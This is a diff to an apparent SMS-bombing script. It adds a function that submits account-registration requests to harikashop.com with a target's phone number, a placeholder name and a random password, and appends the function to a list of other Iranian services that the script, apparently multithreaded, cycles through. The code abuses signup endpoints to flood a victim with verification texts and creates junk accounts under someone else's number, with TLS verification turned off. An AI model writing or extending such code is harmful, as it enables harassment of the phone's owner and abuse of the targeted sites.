@@ -65,6 +65,58 @@ def send_service_safe(service, phone):
 # ==========================
 
 
+def harikashop(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        # تولید اطلاعات تصادفی
+        first_name = "کاربر"
+        last_name = "تست"
+        password = f"Test{random.randint(1000, 9999)}"
+        
+        payload = {
+            'username': formatted_phone,
+            'id_customer': '',
+            'back': 'https://harikashop.com/login?back=my-account',
+            'firstname': first_name,
+            'lastname': last_name,
+            'password': password,
+            'action': 'register',
+            'ajax': '1'
+        }
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": "https://harikashop.com",
+            "Referer": "https://harikashop.com/login?back=my-account"
+        }
+        
+        response = requests.post(
+            "https://harikashop.com/login?back=my-account",
+            data=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[harikashop] Status: {response.status_code}{a}')
+        print(f'{y}[harikashop] Response: {response.text}{a}')
+        
+        if response.status_code == 200:
+            print(f'{g}(harikashop) Registration request sent! ✅{a}')
+            return True
+        else:
+            print(f'{r}[-] harikashop error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] harikashop exception: {e}{a}')
+        return False
+
 
 def masterkala(phone):
     try:
@@ -273,7 +325,7 @@ def drto(phone):
 
 
 
-services = [alibaba, snapp, tebinja, drto, masterkala]
+services = [alibaba, snapp, tebinja, drto, masterkala, harikashop]
 
 # ==========================
 # تابع VIP مولتی‌تردینگ
